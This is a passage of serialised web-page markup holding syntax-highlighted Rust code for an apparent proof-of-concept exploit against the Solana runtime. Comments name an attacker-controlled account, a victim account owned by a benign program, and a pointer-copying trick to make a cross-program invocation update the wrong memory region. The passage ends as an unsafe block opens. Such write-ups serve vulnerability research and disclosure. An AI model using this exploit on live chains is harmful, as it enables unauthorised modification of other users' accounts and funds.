token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"::\"]}]\n9d3:[\"$\",\"span\",\"code-segment-53\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"{\"]}]\n9d4:[\"$\",\"span\",\"code-segment-54\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n9d5:[\"$\",\"span\",\"line-number--10\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[10]}]\n9d6:[\"$\",\"span\",\"code-segment-56\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        \"]}]\n9d7:[\"$\",\"span\",\"code-segment-57\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"AccountMeta\"]}]\n9d8:[\"$\",\"span\",\"code-segment-58\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}]\n9d9:[\"$\",\"span\",\"code-segment-59\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n9da:[\"$\",\"span\",\"line-number--11\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em"])</script><script>self.__next_f.push([1,"\"},\"children\":[11]}]\n9db:[\"$\",\"span\",\"code-segment-61\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        \"]}]\n9dc:[\"$\",\"span\",\"code-segment-62\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Instruction\"]}]\n9dd:[\"$\",\"span\",\"code-segment-63\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}]\n9de:[\"$\",\"span\",\"code-segment-64\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n9df:[\"$\",\"span\",\"line-number--12\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[12]}]\n9e0:[\"$\",\"span\",\"code-segment-66\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}]\n9e1:[\"$\",\"span\",\"code-segment-67\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"}\"]}]\n9e2:[\"$\",\"span\",\"code-segment-68\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}]\n9e3:[\"$\",\"span\",\"code-segment-69\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n9e4:[\"$\",\"span\",\"line-number--13\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[13]}]\n9e5:[\"$\",\"span\",\"code-segment-71\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}]\n9e6:[\"$\",\"span\",\"code-segment-72\",{\"className\":\"token token\",\"style\":{\"color\":\"#e2777a\"},\"children\":[\"program\"]}]\n9e7:[\"$\",\"span\",\"code-segment-73\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"::\"]}]\n9e8:[\"$\",\"span\",\"code-segment-74\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"invoke_signed\"]}]\n9e9:[\"$\",\"span\",\"code-segment-75\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}]\n9ea:[\"$\",\"span\",\"code-segment-76\",{\"className\":\"$undefined\",\"style\":{},\"ch"])</script><script>self.__next_f.push([1,"ildren\":[\"\\n\"]}]\n9eb:[\"$\",\"span\",\"line-number--14\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[14]}]\n9ec:[\"$\",\"span\",\"code-segment-78\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}]\n9ed:[\"$\",\"span\",\"code-segment-79\",{\"className\":\"token token\",\"style\":{\"color\":\"#e2777a\"},\"children\":[\"entrypoint\"]}]\n9ee:[\"$\",\"span\",\"code-segment-80\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"::\"]}]\n9ef:[\"$\",\"span\",\"code-segment-81\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"{\"]}]\n9f0:[\"$\",\"span\",\"code-segment-82\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n9f1:[\"$\",\"span\",\"line-number--15\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[15]}]\n9f2:[\"$\",\"span\",\"code-segment-84\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        \"]}]\n9f3:[\"$\",\"span\",\"code-segment-85\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"self\"]}]\n9f4:[\"$\",\"span\",\"code-segment-86\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}]\n9f5:[\"$\",\"span\",\"code-segment-87\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n9f6:[\"$\",\"span\",\"line-number--16\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[16]}]\n9f7:[\"$\",\"span\",\"code-segment-89\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        \"]}]\n9f8:[\"$\",\"span\",\"code-segment-90\",{\"className\":\"token token\",\"style\":{\"color"])</script><script>self.__next_f.push([1,"\":\"#f8c555\"},\"children\":[\"ProgramResult\"]}]\n9f9:[\"$\",\"span\",\"code-segment-91\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}]\n9fa:[\"$\",\"span\",\"code-segment-92\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n9fb:[\"$\",\"span\",\"line-number--17\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[17]}]\n9fc:[\"$\",\"span\",\"code-segment-94\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}]\n9fd:[\"$\",\"span\",\"code-segment-95\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"}\"]}]\n9fe:[\"$\",\"span\",\"code-segment-96\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}]\n9ff:[\"$\",\"span\",\"code-segment-97\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\na00:[\"$\",\"span\",\"line-number--18\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[18]}]\na01:[\"$\",\"span\",\"code-segment-99\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}]\na02:[\"$\",\"span\",\"code-segment-100\",{\"className\":\"token token\",\"style\":{\"color\":\"#e2777a\"},\"children\":[\"pubkey\"]}]\na03:[\"$\",\"span\",\"code-segment-101\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"::\"]}]\na04:[\"$\",\"span\",\"code-segment-102\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Pubkey\"]}]\na05:[\"$\",\"span\",\"code-segment-103\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}]\na06:[\"$\",\"span\",\"code-segment-104\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\na07:[\"$\",\"span\",\"line-number--19\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingR"])</script><script>self.__next_f.push([1,"ight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[19]}]\na08:[\"$\",\"span\",\"code-segment-106\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\"]}]\na09:[\"$\",\"span\",\"code-segment-107\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"}\"]}]\na0a:[\"$\",\"span\",\"code-segment-108\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\";\"]}]\na0b:[\"$\",\"span\",\"code-segment-109\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\na0c:[\"$\",\"span\",\"line-number--20\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[20]}]\na0d:[\"$\",\"span\",\"line-number--21\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[21]}]\na0e:[\"$\",\"span\",\"code-segment-113\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\"]}]\na0f:[\"$\",\"span\",\"code-segment-114\",{\"className\":\"token token macro\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"entrypoint!\"]}]\na10:[\"$\",\"span\",\"code-segment-115\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}]\na11:[\"$\",\"span\",\"code-segment-116\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"process_instruction\"]}]\na12:[\"$\",\"span\",\"code-segment-117\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}]\na13:[\"$\",\"span\",\"code-segment-118\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\";\"]}]\na14:[\"$\",\"span\",\"code-segment-119\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\na15:[\"$\",\"span\",\"line-number--22\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWid"])</script><script>self.__next_f.push([1,"th\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[22]}]\na16:[\"$\",\"span\",\"line-number--23\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[23]}]\na17:[\"$\",\"span\",\"line-number--24\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[24]}]\na18:[\"$\",\"span\",\"code-segment-125\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\"]}]\na19:[\"$\",\"span\",\"code-segment-126\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// accounts[0] : LEVERAGE account controlled by ATTACKER and owned by EXPLOIT program \"]}]\na1a:[\"$\",\"span\",\"code-segment-127\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\na1b:[\"$\",\"span\",\"line-number--25\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[25]}]\na1c:[\"$\",\"span\",\"code-segment-129\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\"]}]\na1d:[\"$\",\"span\",\"code-segment-130\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// accounts[1] : VICTIM account ATTACKER wants to modify\"]}]\na1e:[\"$\",\"span\",\"code-segment-131\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\na1f:[\"$\",\"span\",\"line-number--26\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"c"])</script><script>self.__next_f.push([1,"olor\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[26]}]\na20:[\"$\",\"span\",\"code-segment-133\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\"]}]\na21:[\"$\",\"span\",\"code-segment-134\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// accounts[2] : BENIGN program that owns VICTIM account ATTACKER wants to modify\"]}]\na22:[\"$\",\"span\",\"code-segment-135\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\na23:[\"$\",\"span\",\"line-number--27\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[27]}]\na24:[\"$\",\"span\",\"code-segment-137\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\"]}]\na25:[\"$\",\"span\",\"code-segment-138\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"pub\"]}]\na26:[\"$\",\"span\",\"code-segment-139\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\na27:[\"$\",\"span\",\"code-segment-140\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"fn\"]}]\na28:[\"$\",\"span\",\"code-segment-141\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\na29:[\"$\",\"span\",\"code-segment-142\",{\"className\":\"token token function-definition\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"process_instruction\"]}]\na2a:[\"$\",\"span\",\"code-segment-143\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}]\na2b:[\"$\",\"span\",\"code-segment-144\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\na2c:[\"$\",\"span\",\"line-number--28\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[28]}]\na2d:[\"$\",\"span\",\"code-segment-146\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    _program_id\"]}]\na2e:[\"$\","])</script><script>self.__next_f.push([1,"\"span\",\"code-segment-147\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\":\"]}]\na2f:[\"$\",\"span\",\"code-segment-148\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\na30:[\"$\",\"span\",\"code-segment-149\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u0026\"]}]\na31:[\"$\",\"span\",\"code-segment-150\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Pubkey\"]}]\na32:[\"$\",\"span\",\"code-segment-151\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}]\na33:[\"$\",\"span\",\"code-segment-152\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\na34:[\"$\",\"span\",\"line-number--29\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[29]}]\na35:[\"$\",\"span\",\"code-segment-154\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    accounts\"]}]\na36:[\"$\",\"span\",\"code-segment-155\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\":\"]}]\na37:[\"$\",\"span\",\"code-segment-156\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\na38:[\"$\",\"span\",\"code-segment-157\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u0026\"]}]\na39:[\"$\",\"span\",\"code-segment-158\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"[\"]}]\na3a:[\"$\",\"span\",\"code-segment-159\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"AccountInfo\"]}]\na3b:[\"$\",\"span\",\"code-segment-160\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"]\"]}]\na3c:[\"$\",\"span\",\"code-segment-161\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}]\na3d:[\"$\",\"span\",\"code-segment-162\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\na3e:[\"$\",\"span\",\"line-number--30\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"rig"])</script><script>self.__next_f.push([1,"ht\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[30]}]\na3f:[\"$\",\"span\",\"code-segment-164\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    _instruction_data\"]}]\na40:[\"$\",\"span\",\"code-segment-165\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\":\"]}]\na41:[\"$\",\"span\",\"code-segment-166\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\na42:[\"$\",\"span\",\"code-segment-167\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u0026\"]}]\na43:[\"$\",\"span\",\"code-segment-168\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"[\"]}]\na44:[\"$\",\"span\",\"code-segment-169\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"u8\"]}]\na45:[\"$\",\"span\",\"code-segment-170\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"]\"]}]\na46:[\"$\",\"span\",\"code-segment-171\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}]\na47:[\"$\",\"span\",\"code-segment-172\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\na48:[\"$\",\"span\",\"line-number--31\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[31]}]\na49:[\"$\",\"span\",\"code-segment-174\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\"]}]\na4a:[\"$\",\"span\",\"code-segment-175\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}]\na4b:[\"$\",\"span\",\"code-segment-176\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\na4c:[\"$\",\"span\",\"code-segment-177\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"-\u003e\"]}]\na4d:[\"$\",\"span\",\"code-segment-178\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\na4e:[\"$\",\"span\",\"code-segment-179\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"ProgramResult\"]}]\na4f:[\"$\",\"span\",\"code-segment-180\",{\"className\":\"$undefined\",\"sty"])</script><script>self.__next_f.push([1,"le\":{},\"children\":[\" \"]}]\na50:[\"$\",\"span\",\"code-segment-181\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"{\"]}]\na51:[\"$\",\"span\",\"code-segment-182\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\na52:[\"$\",\"span\",\"line-number--32\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[32]}]\na53:[\"$\",\"span\",\"line-number--33\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[33]}]\na54:[\"$\",\"span\",\"code-segment-186\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}]\na55:[\"$\",\"span\",\"code-segment-187\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// trigger CoW here to prevent future issues\"]}]\na56:[\"$\",\"span\",\"code-segment-188\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\na57:[\"$\",\"span\",\"line-number--34\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[34]}]\na58:[\"$\",\"span\",\"code-segment-190\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    accounts\"]}]\na59:[\"$\",\"span\",\"code-segment-191\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"[\"]}]\na5a:[\"$\",\"span\",\"code-segment-192\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"0\"]}]\na5b:[\"$\",\"span\",\"code-segment-193\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"]\"]}]\na5c:[\"$\",\"span\",\"code-segment-194\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}]\na5d:[\"$\",\"span\",\"c"])</script><script>self.__next_f.push([1,"ode-segment-195\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"data\"]}]\na5e:[\"$\",\"span\",\"code-segment-196\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}]\na5f:[\"$\",\"span\",\"code-segment-197\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"borrow_mut\"]}]\na60:[\"$\",\"span\",\"code-segment-198\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}]\na61:[\"$\",\"span\",\"code-segment-199\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}]\na62:[\"$\",\"span\",\"code-segment-200\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"[\"]}]\na63:[\"$\",\"span\",\"code-segment-201\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"10\"]}]\na64:[\"$\",\"span\",\"code-segment-202\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"]\"]}]\na65:[\"$\",\"span\",\"code-segment-203\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\na66:[\"$\",\"span\",\"code-segment-204\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"=\"]}]\na67:[\"$\",\"span\",\"code-segment-205\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\na68:[\"$\",\"span\",\"code-segment-206\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"2\"]}]\na69:[\"$\",\"span\",\"code-segment-207\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\";\"]}]\na6a:[\"$\",\"span\",\"code-segment-208\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\na6b:[\"$\",\"span\",\"line-number--35\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[35]}]\na6c:[\"$\",\"span\",\"line-number--36\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"child"])</script><script>self.__next_f.push([1,"ren\":[36]}]\na6d:[\"$\",\"span\",\"code-segment-212\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}]\na6e:[\"$\",\"span\",\"code-segment-213\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// copy data pointers to force the following cpi update_caller_account to update incorrect region\"]}]\na6f:[\"$\",\"span\",\"code-segment-214\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\na70:[\"$\",\"span\",\"line-number--37\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[37]}]\na71:[\"$\",\"span\",\"code-segment-216\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}]\na72:[\"$\",\"span\",\"code-segment-217\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"unsafe\"]}]\na73:[\"$\",\"span\",\"code-segment-218\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"{\"]}]\na74:[\"$\",\"span\",\"code-segment-219\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\na75:[\"$\",\"span\",\"line-number--38\",{\"className\":\"linenumber 